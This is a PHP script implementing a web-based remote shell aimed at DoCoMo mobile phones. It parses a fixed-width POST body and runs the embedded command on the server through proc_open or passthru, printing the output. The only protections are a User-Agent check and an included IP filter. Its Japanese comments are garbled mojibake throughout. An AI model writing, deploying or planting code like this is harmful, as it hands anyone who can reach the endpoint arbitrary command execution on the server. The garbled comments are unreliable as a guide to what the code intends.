<?php
    // IP�t�B���^
    include_once('ipfilter.php');

    // ����ݒ�
    mb_language('Japanese');

    // ���[�U�G�[�W�F���g�擾
    if (!preg_match('/^DoCoMo/', $_SERVER['HTTP_USER_AGENT'])) {
        die($_SERVER['HTTP_USER_AGENT'] . ' �h�R���g�шȊO�ł��B');
    } else {
        ini_set('session.use_trans_sid', '1');
    }

    // �Z�b�V�����X�^�[�g
    session_start();

    if (!isset($_SESSION['SESSION'])) {
        $_SESSION['SESSION'] = 'on';

        // ����̋N���̓p�X��Ԃ�
        if (PHP_OS == 'WIN32' || PHP_OS == 'WINNT') {
            passthru('cd');
        } else {
            passthru('pwd');
        }
        return;
    }

    // POST���擾
    if (isset($HTTP_RAW_POST_DATA)) {
        $stdin = $HTTP_RAW_POST_DATA;
    } else {
        $fp = fopen('php://input', 'r');
        if(!$fp) {
            die('�W�����͂ŃG���[���������܂����B');
        }

        $stdin = '';
        while (!feof($fp)) {
            $stdin .= fgets($fp);
        }
        fclose($fp);
    }

    // �����O�X�`�F�b�N
    if (strlen($stdin) < 58) {
        return;
    }

    // �p�����[�^�����O�X
    $pos = array(14,  // ���t�T�C�Y
                 20,  // SIMID�T�C�Y
                 15,  // �����ԍ��T�C�Y
                  3,  // PATH�T�C�Y
                  6); // �f�[�^�����O�X�T�C�Y

    // �w�b�_���擾
    $date   = substr($stdin, 0,     $pos[$i=0]); $offset  = $pos[$i++];
    $simid  = substr($stdin, $offset, $pos[$i]); $offset += $pos[$i++];
    $termid = substr($stdin, $offset, $pos[$i]); $offset += $pos[$i++];
    $size   = substr($stdin, $offset, $pos[$i]); $offset += $pos[$i++];
    $length = substr($stdin, $offset, $pos[$i]); $offset += $pos[$i++];

    // �X�y�[�X���폜
    $size   = trim($size);
    $length = trim($length);

    // �p�X�擾
    $path = substr($stdin, $offset, $size);

    // �f�[�^������ꍇ
    if ($length > 0) {
        $command = substr($stdin, $offset + $size, $length);
    } else {
        return;
    }

    // cd�R�}���h�̏ꍇ�f�B���N�g�����o��
    if (substr(trim($command), 0, 3) == 'cd ') {
        $temp = trim(substr($command, 3), " \t\n\r");
        // Windows�̏ꍇ
        if (PHP_OS == 'WIN32' || PHP_OS == 'WINNT') {
            // ��΁E���΂𔻕�
            if (substr($temp, 1, 1) == ':') {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            passthru('cd');
        } else {
            // ��΁E���΂𔻕�
            if (substr($temp, 0, 1) == DIRECTORY_SEPARATOR) {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            passthru('pwd');
        }
    } else {
        // �p�X�w�肪�����ꍇ
        if (empty($path)) {
            $path = getcwd();
        }

        // �v���Z�X�I�[�v��
        $process = proc_open($command, array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
            ), $pipes, $path);

        // �v���Z�X�N�����s
        if (!$process) {
            return;
        }

        // �R�}���h����
        $temp = split("\n", $command);
        for ($i = 1; $i < count($temp); $i++){
            fwrite($pipes[0], $temp[$i]);
        }
        fclose($pipes[0]);

        // �ł܂�̖h�~
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        set_time_limit(60);

        // �p�C�v���ǂݏo���\�Ȋ�
        while (!feof($pipes[1]) || !feof($pipes[2])) {

            $in = array($pipes[1], $pipes[2]);
            $ex = $out = null;
            $result = stream_select($in, $out, $ex, 5);

            // �ُ�E�^�C���A�E�g�����ꍇ
            if ($result === false || $result === 0) {
                proc_terminate($process);
                die('�R�}���h���^�C���A�E�g���܂����B');
                break;
            } elseif ($result > 0) {
                // �f�[�^�ǂݏo��
                foreach ($in as $temp) {
                    while (!feof($temp)) {
                        print mb_convert_encoding(fgets($temp), 'SJIS', 'auto');
                    }
                }
            }
        }

        // �v���Z�X�N���[�Y
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
?>
